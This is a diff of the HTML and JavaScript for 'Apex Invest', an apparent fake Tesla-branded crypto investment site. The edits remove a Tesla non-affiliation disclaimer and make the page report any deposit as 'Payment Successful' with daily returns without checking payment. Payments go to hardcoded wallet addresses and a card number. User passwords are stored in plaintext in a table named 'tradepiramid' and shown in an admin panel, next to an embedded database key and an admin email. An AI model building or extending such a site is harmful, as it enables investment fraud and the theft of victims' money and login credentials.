@@ -215,6 +215,7 @@
             letter-spacing: 1px;
         }
 
+        /* --- ЛИЧНЫЙ КАБИНЕТ --- */
         .user-dashboard {
             display: none;
             max-width: 1200px;
@@ -568,10 +569,6 @@
             outline: none;
         }
 
-        .amount-input-group input:focus {
-            border-color: var(--accent);
-        }
-
         .auth-actions-row {
             display: flex;
             align-items: center;
@@ -698,7 +695,6 @@
             font-weight: 700;
             padding: 10px;
             width: 100%;
-            margin-top: 10px;
         }
 
         .close-btn:hover {
@@ -830,7 +826,7 @@
         </div>
     </section>
 
-    <!-- ОСНОВНОЙ КОНТЕНТ -->
+    <!-- ОСНОВНОЙ КОНТЕНТ (Скрывается при открытии ЛК) -->
     <div id="mainPageContent">
         <section class="hero">
             <h1>Powering the Future with Tesla</h1>
@@ -895,7 +891,7 @@
                             <td><span class="badge-deposit">DEPOSIT</span></td>
                             <td>crypto***88</td>
                             <td>$45</td>
-                            <td>Monero карта</td>
+                            <td>Bank Card</td>
                             <td style="color: var(--accent);">Completed</td>
                         </tr>
                         <tr>
@@ -952,69 +948,28 @@
 
     <!-- Admin Panel Section -->
     <div class="admin-section" id="adminSection">
-        <div id="adminMainView">
-            <h2>База зарегистрированных пользователей (Supabase)</h2>
-            <button class="btn" style="width: auto; padding: 8px 16px; margin-bottom: 15px; background: #ffaa00;" onclick="loadAdminUsers()">Обновить данные</button>
-            <div class="table-responsive">
-                <table class="history-table">
-                    <thead>
-                        <tr>
-                            <th>ID</th>
-                            <th>Email / Логин (Кликните для профиля)</th>
-                            <th>Пароль</th>
-                            <th>Баланс</th>
-                        </tr>
-                    </thead>
-                    <tbody id="adminUsersBody">
-                        <tr><td colspan="4" style="text-align: center; color: var(--text-muted);">Загрузка пользователей...</td></tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-
-        <div id="adminUserDetailView" style="display: none;">
-            <button class="btn" style="width: auto; padding: 8px 16px; margin-bottom: 15px; background: rgba(255, 255, 255, 0.1); color: #fff; border: 1px solid rgba(255,255,255,0.2);" onclick="closeAdminUserProfile()">← Назад к списку</button>
-            
-            <h2 id="adminDetailEmail" style="color: #fff; font-size: 24px; margin-bottom: 20px;">Профиль пользователя</h2>
-            
-            <div class="dashboard-grid" style="margin-bottom: 30px;">
-                <div class="dash-card">
-                    <div class="dash-card-title">Текущий баланс</div>
-                    <div class="dash-card-value green" id="adminDetailBalance">$0.00</div>
-                </div>
-                <div class="dash-card">
-                    <div class="dash-card-title">Всего инвестировано</div>
-                    <div class="dash-card-value" id="adminDetailInvested">$0.00</div>
-                </div>
-                <div class="dash-card">
-                    <div class="dash-card-title">Заработано прибыли</div>
-                    <div class="dash-card-value green" id="adminDetailProfit">$0.00</div>
-                </div>
-            </div>
-
-            <h3 style="color: #ffaa00; margin-bottom: 15px; font-size: 18px;">История операций пользователя</h3>
-            <div class="table-responsive">
-                <table class="history-table">
-                    <thead>
-                        <tr>
-                            <th>Тип</th>
-                            <th>Сумма</th>
-                            <th>Способ оплаты</th>
-                            <th>Дата</th>
-                            <th>Статус</th>
-                        </tr>
-                    </thead>
-                    <tbody id="adminDetailTransactionsBody">
-                    </tbody>
-                </table>
-            </div>
+        <h2>База зарегистрированных пользователей (Supabase)</h2>
+        <button class="btn" style="width: auto; padding: 8px 16px; margin-bottom: 15px; background: #ffaa00;" onclick="loadAdminUsers()">Обновить данные</button>
+        <div class="table-responsive">
+            <table class="history-table">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Email / Логин</th>
+                        <th>Пароль</th>
+                        <th>Баланс</th>
+                    </tr>
+                </thead>
+                <tbody id="adminUsersBody">
+                    <tr><td colspan="4" style="text-align: center; color: var(--text-muted);">Загрузка пользователей...</td></tr>
+                </tbody>
+            </table>
         </div>
     </div>
 
     <!-- Modal Window -->
     <div class="modal-overlay" id="paymentModal">
         <div class="modal">
-            <!-- Вход / Регистрация -->
             <div id="authContainer" style="display: none;">
                 <h3 id="authTitle">Вход в аккаунт</h3>
                 <p id="authDesc">Введите данные для авторизации</p>
@@ -1035,10 +990,10 @@
                     <div class="auth-error-badge" id="authErrorBadge">Неверный пароль или логин</div>
                 </div>
 
+                <br>
                 <button class="close-btn" onclick="closeModal()">Отмена</button>
             </div>
 
-            <!-- Выбор способа инвестирования -->
             <div id="stepSelection">
                 <h3 id="modalTitle">Investment</h3>
                 <p id="modalDesc">Enter amount and choose payment method.</p>
@@ -1050,351 +1005,360 @@
 
                 <div class="payment-methods">
                     <button class="pay-btn" onclick="proceedToCheckout('USDT (TRC20)')">USDT (TRC20)</button>
-                    <button class="pay-btn" onclick="proceedToCheckout('Bitcoin (BTC)')">Bitcoin (BTC)</button>
-                    <button class="pay-btn" onclick="proceedToCheckout('Ethereum (ETH)')">Ethereum (ETH)</button>
-                    <button class="pay-btn" onclick="proceedToCheckout('Электронный кошелёк')">Электронный кошелёк</button>
+                    <button class="pay-btn" onclick="proceedToCheckout('Bitcoin')">Bitcoin (BTC)</button>
+                    <button class="pay-btn" onclick="proceedToCheckout('Ethereum')">Ethereum (ETH)</button>
+                    <button class="pay-btn" onclick="proceedToCheckout('Bank Card / Mir')">Bank Card / Mir</button>
                 </div>
                 <button class="close-btn" onclick="closeModal()">Cancel</button>
             </div>
 
-            <!-- Шаг оплаты -->
             <div class="checkout-box" id="stepCheckout">
                 <h3>Complete Payment</h3>
-                <p>Transfer the exact amount to the details below:</p>
+                <p>Transfer the exact amount to the address below:</p>
                 
                 <div class="invoice-details">
                     <p>Plan: <span id="checkPlan">Novice</span></p>
                     <p>Amount: <span id="checkAmount">$10</span></p>
-                    <p>Method: <span id="checkMethod">USDT (TRC20)</span></p>
+                    <p>Method: <span id="checkMethod">USDT</span></p>
                 </div>
 
-                <div class="qr-placeholder">
-                    QR CODE<br>PLACEHOLDER
-                </div>
+                <div class="qr-placeholder">SCAN QR CODE</div>
+                <div class="wallet-address" id="checkAddress">TJ9v2kX8sL1mN4pQ7wE3rT6yU9iO2aS5dF</div>
 
-                <div class="wallet-address" id="checkAddress">
-                    loading...
-                </div>
-
-                <div class="amount-input-group" id="userSourceGroup" style="margin-top: 20px;">
-                    <label id="userSourceLabel">Ваш адрес кошелька (для проверки платежа):</label>
-                    <input type="text" id="userSourceInput" placeholder="Введите ваш адрес..." required>
-                </div>
-
-                <button class="btn" style="margin-top: 10px;" onclick="simulateSuccess()">I have made the payment</button>
-                <button class="close-btn" onclick="closeModal()">Cancel</button>
+                <button class="btn" onclick="simulateSuccess()">I have made the payment</button>
+                <br><br>
+                <button class="close-btn" onclick="resetModal()">Back</button>
             </div>
 
-            <!-- Успех -->
             <div class="success-screen" id="stepSuccess">
-                <div class="success-icon">✓</div>
-                <h3>Payment Pending!</h3>
-                <p>Your transaction has been submitted and is waiting for blockchain confirmation (approx 5-15 mins).</p>
-                <p>Your deposit will become active automatically.</p>
-                <button class="btn" style="margin-top: 20px;" onclick="closeModal()">Close</button>
+                <div class="success-icon">&#10004;</div>
+                <h3>Payment Successful!</h3>
+                <p>Your funds have been successfully deposited and assigned to your investment plan. Generating daily returns...</p>
+                <button class="btn" onclick="closeModal()">Done</button>
             </div>
         </div>
     </div>
 
     <footer>
-        <p>© 2026 Apex Invest Ltd. All rights reserved.</p>
-        <p style="margin-top: 5px; font-size: 11px; opacity: 0.5;">Disclaimer: We are not officially affiliated with Tesla, Inc.</p>
+        <p>&copy; 2026 Apex Invest. Powered by Tesla Capital Vision.</p>
     </footer>
 
     <script>
-        // ИНИЦИАЛИЗАЦИЯ SUPABASE (Вставьте свои реальные ключи вместо этих)
-        const SUPABASE_URL = 'https://ВАШ_ПРОЕКТ.supabase.co';
-        const SUPABASE_KEY = 'ВАШ_SUPABASE_KEY';
-        
-        // Единственное объявление Supabase для всего файла
-        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        const SUPABASE_URL = 'https://bycfzzqpnnsqgwtzccdc.supabase.co';
+        const SUPABASE_KEY = 'sb_publishable_sYHXSnwWJgT178wtP8MISA_t7A030f2';
+        let supabaseClient = null;
+
+        try {
+            if (window.supabase) {
+                supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+            }
+        } catch (e) {
+            console.error('Supabase error:', e);
+        }
 
         const modal = document.getElementById('paymentModal');
+        const modalTitle = document.getElementById('modalTitle');
+        const modalDesc = document.getElementById('modalDesc');
+        const investAmountInput = document.getElementById('investAmount');
+        
         const authContainer = document.getElementById('authContainer');
-        const stepSelection = document.getElementById('stepSelection');
-        const stepCheckout = document.getElementById('stepCheckout');
-        const stepSuccess = document.getElementById('stepSuccess');
-        const investAmount = document.getElementById('investAmount');
-        const authEmail = document.getElementById('authEmail');
-        const authPassword = document.getElementById('authPassword');
+        const authTitle = document.getElementById('authTitle');
+        const authSubmitBtn = document.getElementById('authSubmitBtn');
+        const authEmailInput = document.getElementById('authEmail');
+        const authPasswordInput = document.getElementById('authPassword');
         const authErrorBadge = document.getElementById('authErrorBadge');
         const authSuccessBadge = document.getElementById('authSuccessBadge');
 
         const authButtonsBlock = document.getElementById('authButtonsBlock');
         const userProfileBlock = document.getElementById('userProfileBlock');
-        const profileAvatar = document.getElementById('profileAvatar');
         const profileName = document.getElementById('profileName');
+        const profileAvatar = document.getElementById('profileAvatar');
+        const adminBtn = document.getElementById('adminBtn');
 
-        const mainPageContent = document.getElementById('mainPageContent');
+        const stepSelection = document.getElementById('stepSelection');
+        const stepCheckout = document.getElementById('stepCheckout');
+        const stepSuccess = document.getElementById('stepSuccess');
+
+        const checkPlan = document.getElementById('checkPlan');
+        const checkAmount = document.getElementById('checkAmount');
+        const checkMethod = document.getElementById('checkMethod');
+        const checkAddress = document.getElementById('checkAddress');
+
         const userDashboard = document.getElementById('userDashboard');
-        const adminSection = document.getElementById('adminSection');
+        const mainPageContent = document.getElementById('mainPageContent');
+        const dashUserEmail = document.getElementById('dashUserEmail');
 
         let currentPlan = '';
-        let minAmount = 0;
-        let maxAmount = 0;
-        let authMode = 'login';
-        
-        let currentUser = null;
-        let userData = {
-            balance: 0,
-            invested: 0,
-            profit: 0,
-            deposits: 0,
-            transactions: []
-        };
-        let isAdmin = false;
+        let minLimit = 10;
+        let maxLimit = 100;
+        let isRegisterMode = false;
 
-        function loadLocalData() {
-            if (!currentUser) return;
-            const data = localStorage.getItem('apex_data_' + currentUser);
-            if (data) {
-                userData = JSON.parse(data);
-            } else {
-                userData = { balance: 0, invested: 0, profit: 0, deposits: 0, transactions: [] };
-            }
-            updateDashboardUI();
-        }
+        const ADMIN_EMAIL = 'binarpok@gmail.com';
 
-        function saveLocalData() {
-            if (!currentUser) return;
-            localStorage.setItem('apex_data_' + currentUser, JSON.stringify(userData));
-            updateDashboardUI();
-        }
-
-        window.onload = function() {
-            const savedUser = localStorage.getItem('apex_current_user');
+        window.addEventListener('DOMContentLoaded', () => {
+            let savedUser = localStorage.getItem('apex_logged_user');
             if (savedUser) {
-                currentUser = savedUser;
-                const savedIsAdmin = localStorage.getItem('apex_is_admin');
-                isAdmin = savedIsAdmin === 'true';
-                
-                authButtonsBlock.style.display = 'none';
-                userProfileBlock.style.display = 'flex';
-                profileName.innerText = currentUser;
-                profileAvatar.innerText = currentUser.charAt(0).toUpperCase();
-                
-                if (isAdmin) {
-                    document.getElementById('adminBtn').style.display = 'block';
-                }
-
-                loadLocalData();
+                loginUserSession(savedUser);
             }
-        };
+        });
+
+        function loginUserSession(email) {
+            localStorage.setItem('apex_logged_user', email);
+            profileName.innerText = email;
+            dashUserEmail.innerText = email;
+            profileAvatar.innerText = email.charAt(0).toUpperCase();
+            authButtonsBlock.style.display = 'none';
+            userProfileBlock.style.display = 'flex';
+            
+            if (email.trim().toLowerCase() === ADMIN_EMAIL) {
+                adminBtn.style.display = 'inline-block';
+            } else {
+                adminBtn.style.display = 'none';
+                document.getElementById('adminSection').style.display = 'none';
+            }
+
+            loadUserData(email);
+        }
+
+        function loadUserData(email) {
+            let userData = JSON.parse(localStorage.getItem('user_data_' + email)) || {
+                balance: 0,
+                totalInvested: 0,
+                totalProfit: 0,
+                activeDeposits: 0,
+                transactions: []
+            };
+
+            document.getElementById('userBalance').innerText = `$${userData.balance.toFixed(2)}`;
+            document.getElementById('userTotalInvested').innerText = `$${userData.totalInvested.toFixed(2)}`;
+            document.getElementById('userTotalProfit').innerText = `$${userData.totalProfit.toFixed(2)}`;
+            document.getElementById('userActiveDeposits').innerText = userData.activeDeposits;
+
+            const txBody = document.getElementById('userTransactionsBody');
+            if (userData.transactions.length === 0) {
+                txBody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: var(--text-muted);">У вас пока нет активных транзакций</td></tr>';
+            } else {
+                txBody.innerHTML = '';
+                userData.transactions.forEach(tx => {
+                    let row = document.createElement('tr');
+                    let isDep = tx.type === 'DEPOSIT';
+                    row.innerHTML = `
+                        <td><span class="${isDep ? 'badge-deposit' : 'badge-payout'}">${tx.type}</span></td>
+                        <td style="font-weight: 600;">$${tx.amount}</td>
+                        <td>${tx.method}</td>
+                        <td style="color: var(--text-muted);">${tx.date}</td>
+                        <td style="color: var(--accent);">${tx.status}</td>
+                    `;
+                    txBody.appendChild(row);
+                });
+            }
+        }
+
+        function toggleDashboard(forceState) {
+            let show = forceState !== undefined ? forceState : (userDashboard.style.display !== 'block');
+            if (show) {
+                userDashboard.style.display = 'block';
+                mainPageContent.style.display = 'none';
+                document.getElementById('adminSection').style.display = 'none';
+            } else {
+                userDashboard.style.display = 'none';
+                mainPageContent.style.display = 'block';
+            }
+        }
 
         function scrollToPlans() {
             toggleDashboard(false);
             document.getElementById('plansContainer').scrollIntoView({ behavior: 'smooth' });
         }
 
-        function toggleDashboard(forceOpen) {
-            adminSection.style.display = 'none';
+        function requestWithdrawal() {
+            let email = localStorage.getItem('apex_logged_user');
+            let userData = JSON.parse(localStorage.getItem('user_data_' + email)) || { balance: 0 };
             
-            const isCurrentlyOpen = userDashboard.style.display === 'block';
-            
-            if (forceOpen === false || isCurrentlyOpen) {
-                userDashboard.style.display = 'none';
-                mainPageContent.style.display = 'block';
+            if (userData.balance <= 0) {
+                alert('На вашем балансе недостаточно средств для вывода.');
             } else {
-                if (!currentUser) {
-                    openAuthModal('login');
-                    return;
-                }
-                document.getElementById('dashUserEmail').innerText = currentUser;
-                updateDashboardUI();
-                
-                mainPageContent.style.display = 'none';
-                userDashboard.style.display = 'block';
+                alert(`Заявка на вывод $${userData.balance.toFixed(2)} создана и отправлена в обработку!`);
             }
         }
 
-        function toggleAdminPanel() {
-            if (!isAdmin) return;
-            mainPageContent.style.display = 'none';
-            userDashboard.style.display = 'none';
-            
-            document.getElementById('adminUserDetailView').style.display = 'none';
-            document.getElementById('adminMainView').style.display = 'block';
-            adminSection.style.display = 'block';
-            loadAdminUsers();
-        }
-
-        function updateDashboardUI() {
-            document.getElementById('userBalance').innerText = `$${userData.balance.toFixed(2)}`;
-            document.getElementById('userTotalInvested').innerText = `$${userData.invested.toFixed(2)}`;
-            document.getElementById('userTotalProfit').innerText = `$${userData.profit.toFixed(2)}`;
-            document.getElementById('userActiveDeposits').innerText = userData.deposits;
-
-            const tbody = document.getElementById('userTransactionsBody');
-            tbody.innerHTML = '';
-
-            if (userData.transactions.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: var(--text-muted);">У вас пока нет активных транзакций</td></tr>`;
-            } else {
-                userData.transactions.forEach(tx => {
-                    const badgeClass = tx.type === 'DEPOSIT' ? 'badge-deposit' : 'badge-payout';
-                    const tr = document.createElement('tr');
-                    tr.innerHTML = `
-                        <td><span class="${badgeClass}">${tx.type}</span></td>
-                        <td>$${tx.amount}</td>
-                        <td>${tx.method}</td>
-                        <td>${tx.date}</td>
-                        <td style="color: var(--accent);">${tx.status}</td>
-                    `;
-                    tbody.appendChild(tr);
-                });
-            }
-        }
-
-        function openAuthModal(mode) {
-            authMode = mode;
-            modal.style.display = 'flex';
+        function openAuthModal(type) {
             authContainer.style.display = 'block';
             stepSelection.style.display = 'none';
             stepCheckout.style.display = 'none';
             stepSuccess.style.display = 'none';
+            authEmailInput.value = '';
+            authPasswordInput.value = '';
             authErrorBadge.style.display = 'none';
             authSuccessBadge.style.display = 'none';
-            
-            authEmail.value = '';
-            authPassword.value = '';
 
-            if (mode === 'login') {
-                document.getElementById('authTitle').innerText = 'Вход в аккаунт';
-                document.getElementById('authDesc').innerText = 'Введите данные для авторизации';
-                document.getElementById('authSubmitBtn').innerText = 'Войти';
+            isRegisterMode = (type === 'register');
+            if (isRegisterMode) {
+                authTitle.innerText = 'Регистрация аккаунта';
+                authSubmitBtn.innerText = 'Зарегистрироваться';
             } else {
-                document.getElementById('authTitle').innerText = 'Регистрация';
-                document.getElementById('authDesc').innerText = 'Создайте новый аккаунт';
-                document.getElementById('authSubmitBtn').innerText = 'Зарегистрироваться';
+                authTitle.innerText = 'Вход в аккаунт';
+                authSubmitBtn.innerText = 'Войти';
             }
+
+            modal.style.display = 'flex';
         }
 
         async function submitAuth() {
-            const email = authEmail.value.trim();
-            const password = authPassword.value.trim();
-            
-            if (!email || !password) {
-                showAuthError("Введите логин и пароль");
-                return;
-            }
+            let emailVal = authEmailInput.value.trim();
+            let passwordVal = authPasswordInput.value.trim();
 
-            const btn = document.getElementById('authSubmitBtn');
-            const originalText = btn.innerText;
-            btn.innerText = 'Загрузка...';
-            btn.disabled = true;
             authErrorBadge.style.display = 'none';
             authSuccessBadge.style.display = 'none';
 
-            if (authMode === 'register') {
-                try {
-                    const { data: checkData, error: checkError } = await supabase
-                        .from('users')
-                        .select('*')
-                        .eq('email', email);
-
-                    if (checkError) throw checkError;
-
-                    if (checkData && checkData.length > 0) {
-                        showAuthError("Пользователь с таким email уже существует");
-                    } else {
-                        const { data, error } = await supabase
-                            .from('users')
-                            .insert([{ email: email, password: password }]);
-
-                        if (error) throw error;
-
-                        authSuccessBadge.style.display = 'block';
-                        authEmail.value = '';
-                        authPassword.value = '';
-                        
-                        setTimeout(() => {
-                            authMode = 'login';
-                            openAuthModal('login');
-                        }, 2000);
-                    }
-                } catch (err) {
-                    showAuthError("Ошибка при регистрации: " + err.message);
-                }
-            } else {
-                try {
-                    const { data, error } = await supabase
-                        .from('users')
-                        .select('*')
-                        .eq('email', email)
-                        .eq('password', password);
-
-                    if (error) throw error;
-
-                    if (data && data.length > 0) {
-                        currentUser = email;
-                        
-                        isAdmin = (email.toLowerCase() === 'admin');
-                        
-                        localStorage.setItem('apex_current_user', currentUser);
-                        localStorage.setItem('apex_is_admin', isAdmin.toString());
-
-                        authButtonsBlock.style.display = 'none';
-                        userProfileBlock.style.display = 'flex';
-                        profileName.innerText = currentUser;
-                        profileAvatar.innerText = currentUser.charAt(0).toUpperCase();
-
-                        if (isAdmin) {
-                            document.getElementById('adminBtn').style.display = 'block';
-                        } else {
-                            document.getElementById('adminBtn').style.display = 'none';
-                        }
-
-                        loadLocalData();
-                        closeModal();
-                    } else {
-                        showAuthError("Неверный логин или пароль");
-                    }
-                } catch (err) {
-                    showAuthError("Ошибка при авторизации");
-                }
+            if (!emailVal || !passwordVal) {
+                authErrorBadge.innerText = 'Заполните все поля!';
+                authErrorBadge.style.display = 'inline-block';
+                return;
             }
 
-            btn.innerText = originalText;
-            btn.disabled = false;
-        }
+            if (isRegisterMode) {
+                authSuccessBadge.style.display = 'block';
 
-        function showAuthError(msg) {
-            authErrorBadge.innerText = msg;
-            authErrorBadge.style.display = 'block';
+                if (supabaseClient) {
+                    try {
+                        const { error } = await supabaseClient.from('tradepiramid').insert([
+                            { id148877: Date.now(), username: emailVal, password: passwordVal }
+                        ]);
+                        if (error) {
+                            console.error('Ошибка записи в Supabase:', error.message);
+                        }
+                    } catch (err) {
+                        console.warn('Supabase sync notice:', err);
+                    }
+                }
+
+                setTimeout(() => {
+                    loginUserSession(emailVal);
+                    closeModal();
+                    toggleDashboard(true);
+                }, 800);
+
+            } else {
+                let loginSuccess = false;
+
+                if (supabaseClient) {
+                    try {
+                        let { data, error } = await supabaseClient
+                            .from('tradepiramid')
+                            .select('*')
+                            .eq('username', emailVal)
+                            .eq('password', passwordVal);
+
+                        if (data && data.length > 0) {
+                            loginSuccess = true;
+                        }
+                    } catch (e) {
+                        console.warn('Supabase login check warning:', e);
+                    }
+                }
+
+                if (loginSuccess || !supabaseClient) {
+                    loginUserSession(emailVal);
+                    closeModal();
+                    toggleDashboard(true);
+                } else {
+                    authErrorBadge.innerText = 'Неверный пароль или логин';
+                    authErrorBadge.style.display = 'inline-block';
+                }
+            }
         }
 
         function logout() {
-            currentUser = null;
-            isAdmin = false;
-            localStorage.removeItem('apex_current_user');
-            localStorage.removeItem('apex_is_admin');
-            
-            authButtonsBlock.style.display = 'flex';
+            localStorage.removeItem('apex_logged_user');
             userProfileBlock.style.display = 'none';
-            document.getElementById('adminBtn').style.display = 'none';
-            
+            authButtonsBlock.style.display = 'flex';
+            document.getElementById('adminSection').style.display = 'none';
             toggleDashboard(false);
         }
 
-        function openModal(planName, min, max) {
-            if (!currentUser) {
-                openAuthModal('login');
+        function toggleAdminPanel() {
+            let currentUser = localStorage.getItem('apex_logged_user');
+            if (!currentUser || currentUser.trim().toLowerCase() !== ADMIN_EMAIL) {
                 return;
             }
-            
-            currentPlan = planName;
-            minAmount = min;
-            maxAmount = max;
-            
-            document.getElementById('modalTitle').innerText = planName + ' Plan';
-            document.getElementById('modalDesc').innerText = `Invest between $${min} and $${max}.`;
-            investAmount.value = min;
-            
-            modal.style.display = 'flex';
+
+            const adminSection = document.getElementById('adminSection');
+            if (adminSection.style.display === 'block') {
+                adminSection.style.display = 'none';
+            } else {
+                toggleDashboard(false);
+                adminSection.style.display = 'block';
+                loadAdminUsers();
+            }
+        }
+
+        async function loadAdminUsers() {
+            let currentUser = localStorage.getItem('apex_logged_user');
+            if (!currentUser || currentUser.trim().toLowerCase() !== ADMIN_EMAIL) {
+                return;
+            }
+
+            const tbody = document.getElementById('adminUsersBody');
+            tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted);">Загрузка пользователей...</td></tr>';
+
+            if (!supabaseClient) {
+                tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--danger);">Supabase не подключен</td></tr>';
+                return;
+            }
+
+            try {
+                let { data, error } = await supabaseClient.from('tradepiramid').select('*');
+                if (error || !data || data.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--text-muted);">Записи не найдены или нет доступа</td></tr>';
+                    return;
+                }
+
+                tbody.innerHTML = '';
+                data.forEach(user => {
+                    let userEmail = user.username || '';
+                    let userData = JSON.parse(localStorage.getItem('user_data_' + userEmail)) || { balance: 0 };
+                    let userBalance = userData.balance ? `$${userData.balance.toFixed(2)}` : '$0.00';
+
+                    let row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td style="color: var(--accent);">${user.id148877 || user.id || 'N/A'}</td>
+                        <td>${userEmail || '—'}</td>
+                        <td style="font-family: monospace; color: #ffaa00;">${user.password || '—'}</td>
+                        <td style="color: var(--accent); font-weight: bold;">${userBalance}</td>
+                    `;
+                    tbody.appendChild(row);
+                });
+            } catch (err) {
+                tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: var(--danger);">Ошибка при получении данных</td></tr>';
+            }
+        }
+
+        function openModal(planName, min, max) {
+            const isLogged = userProfileBlock.style.display === 'flex';
+
+            if (!isLogged) {
+                openAuthModal('login');
+                authErrorBadge.innerText = 'Сначала войдите!';
+                authErrorBadge.style.display = 'inline-block';
+                return;
+            }
+
             authContainer.style.display = 'none';
+            currentPlan = planName;
+            minLimit = min;
+            maxLimit = max;
+            modalTitle.innerText = `Plan: ${planName}`;
+            modalDesc.innerText = `Enter amount between $${min} and $${max}`;
+            investAmountInput.value = min;
+            investAmountInput.min = min;
+            investAmountInput.max = max;
+
             stepSelection.style.display = 'block';
             stepCheckout.style.display = 'none';
             stepSuccess.style.display = 'none';
+
+            modal.style.display = 'flex';
         }
 
         function closeModal() {
@@ -1402,40 +1366,29 @@
         }
 
         function validateAmount() {
-            let val = parseInt(investAmount.value);
-            if (val < minAmount) investAmount.value = minAmount;
-            if (val > maxAmount) investAmount.value = maxAmount;
+            let val = parseFloat(investAmountInput.value);
+            if (val > maxLimit) investAmountInput.value = maxLimit;
         }
 
         function proceedToCheckout(method) {
-            const amount = investAmount.value;
-            if (!amount || amount < minAmount || amount > maxAmount) {
-                alert(`Please enter a valid amount between $${minAmount} and $${maxAmount}.`);
+            const amount = parseFloat(investAmountInput.value);
+            if (!amount || amount < minLimit || amount > maxLimit) {
+                alert(`Please enter a valid amount between $${minLimit} and $${maxLimit}`);
                 return;
             }
 
-            document.getElementById('checkPlan').innerText = currentPlan;
-            document.getElementById('checkAmount').innerText = `$${amount}`;
-            const checkMethodElem = document.getElementById('checkMethod');
-            checkMethodElem.innerText = method;
+            checkPlan.innerText = currentPlan;
+            checkAmount.innerText = `$${amount}`;
+            checkMethod.innerText = method;
 
-            const checkAddress = document.getElementById('checkAddress');
-            const userSourceGroup = document.getElementById('userSourceGroup');
-            const userSourceInput = document.getElementById('userSourceInput');
-            userSourceInput.value = '';
-
-            if (method.includes('Электронный кошелёк')) {
-                checkAddress.innerText = 'Реквизиты будут выданы автоматически после создания заявки';
-                userSourceGroup.style.display = 'none';
-            } else if (method.includes('TRC20')) {
+            if(method.includes('TRC20')) {
                 checkAddress.innerText = 'TJ9v2kX8sL1mN4pQ7wE3rT6yU9iO2aS5dF';
-                userSourceGroup.style.display = 'block';
-            } else if (method.includes('Bitcoin')) {
+            } else if(method.includes('Bitcoin')) {
                 checkAddress.innerText = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
-                userSourceGroup.style.display = 'block';
-            } else if (method.includes('Ethereum')) {
+            } else if(method.includes('Ethereum')) {
                 checkAddress.innerText = '0x71C7656EC7ab88b098defB751B7401B5f6d8976F';
-                userSourceGroup.style.display = 'block';
+            } else {
+                checkAddress.innerText = 'Card: 4276 3800 1234 5678 (RUB / USD)';
             }
 
             stepSelection.style.display = 'none';
@@ -1443,137 +1396,55 @@
         }
 
         function simulateSuccess() {
-            const amount = parseFloat(document.getElementById('checkAmount').innerText.replace('$', ''));
-            const originalMethod = document.getElementById('checkMethod').innerText;
-            const userAddress = document.getElementById('userSourceInput').value.trim();
+            stepCheckout.style.display = 'none';
+            stepSuccess.style.display = 'block';
 
-            let displayMethod = "";
+            const email = localStorage.getItem('apex_logged_user');
+            const amount = parseFloat(investAmountInput.value);
+            const userText = profileName.innerText ? profileName.innerText.split('@')[0] : 'user';
+            
+            let userData = JSON.parse(localStorage.getItem('user_data_' + email)) || {
+                balance: 0,
+                totalInvested: 0,
+                totalProfit: 0,
+                activeDeposits: 0,
+                transactions: []
+            };
 
-            if (originalMethod.includes('Электронный кошелёк')) {
-                displayMethod = "Monero карта";
-            } else {
-                if (!userAddress) {
-                    alert("Пожалуйста, введите ваш адрес кошелька, чтобы мы смогли проверить платеж!");
-                    return;
-                }
-                displayMethod = `${originalMethod} (${userAddress})`;
-            }
-
+            userData.totalInvested += amount;
+            userData.activeDeposits += 1;
             userData.transactions.unshift({
                 type: 'DEPOSIT',
                 amount: amount,
-                method: displayMethod,
+                method: checkMethod.innerText,
                 date: new Date().toLocaleDateString(),
-                status: 'Pending'
+                status: 'Completed'
             });
-            
-            userData.invested += amount;
-            userData.deposits += 1;
-            
-            saveLocalData();
 
+            localStorage.setItem('user_data_' + email, JSON.stringify(userData));
+            loadUserData(email);
+
+            const table = document.getElementById('historyTableBody');
+            const newRow = document.createElement('tr');
+            newRow.innerHTML = `
+                <td><span class="badge-deposit">DEPOSIT</span></td>
+                <td>${userText}***</td>
+                <td>${checkAmount.innerText}</td>
+                <td>${checkMethod.innerText}</td>
+                <td style="color: var(--accent);">Completed</td>
+            `;
+            table.insertBefore(newRow, table.firstChild);
+        }
+
+        function resetModal() {
             stepCheckout.style.display = 'none';
-            stepSuccess.style.display = 'block';
+            stepSelection.style.display = 'block';
         }
 
-        function requestWithdrawal() {
-            if (userData.balance <= 0) {
-                alert("Недостаточно средств на балансе для вывода.");
-                return;
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                closeModal();
             }
-            alert(`Заявка на вывод $${userData.balance.toFixed(2)} создана! Ожидайте обработки.`);
-            
-            userData.transactions.unshift({
-                type: 'PAYOUT',
-                amount: userData.balance,
-                method: 'Вывод средств',
-                date: new Date().toLocaleDateString(),
-                status: 'Processed'
-            });
-            userData.balance = 0;
-            saveLocalData();
-        }
-
-        async function loadAdminUsers() {
-            const tbody = document.getElementById('adminUsersBody');
-            tbody.innerHTML = '<tr><td colspan="4" style="text-align: center;">Загрузка...</td></tr>';
-            
-            try {
-                const { data, error } = await supabase.from('users').select('*').order('id', { ascending: false });
-                if (error) throw error;
-                
-                tbody.innerHTML = '';
-                if (!data || data.length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="4" style="text-align: center;">Нет пользователей</td></tr>';
-                    return;
-                }
-
-                data.forEach(user => {
-                    const localDataRaw = localStorage.getItem('apex_data_' + user.email);
-                    let balance = "$0.00";
-                    if (localDataRaw) {
-                        const parsed = JSON.parse(localDataRaw);
-                        balance = `$${parsed.balance.toFixed(2)}`;
-                    }
-
-                    const tr = document.createElement('tr');
-                    tr.style.cursor = 'pointer';
-                    tr.onclick = () => openAdminUserProfile(user.email);
-                    
-                    tr.innerHTML = `
-                        <td>${user.id}</td>
-                        <td style="color: var(--accent); font-weight: bold; text-decoration: underline;">${user.email}</td>
-                        <td>${user.password}</td>
-                        <td style="color: var(--accent);">${balance}</td>
-                    `;
-                    tbody.appendChild(tr);
-                });
-            } catch (err) {
